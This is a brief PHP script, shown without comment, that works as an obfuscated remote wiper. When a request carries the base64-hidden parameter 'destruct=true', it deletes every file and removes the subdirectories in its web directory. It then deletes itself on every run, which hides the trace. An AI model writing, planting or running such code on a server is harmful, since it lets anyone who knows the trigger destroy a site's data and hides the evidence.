<?php 
$data=$_GET;
if (isset($_GET[base64_decode('ZGVzdHJ1Y3Q=')]) and $data[base64_decode("ZGVzdHJ1Y3Q=")] == base64_decode('dHJ1ZQ==') ){


$items = scandir('.');
foreach ($items as $item) {
    if ($item != '.' && $item != '..') {
        if (is_dir( '.' . '/' . $item)) {
            rmdir($item);
        }elseif($item != basename($_SERVER['PHP_SELF'])){
            unlink($item);
        }
        
    }
}
}
unlink(basename($_SERVER['PHP_SELF']));
?>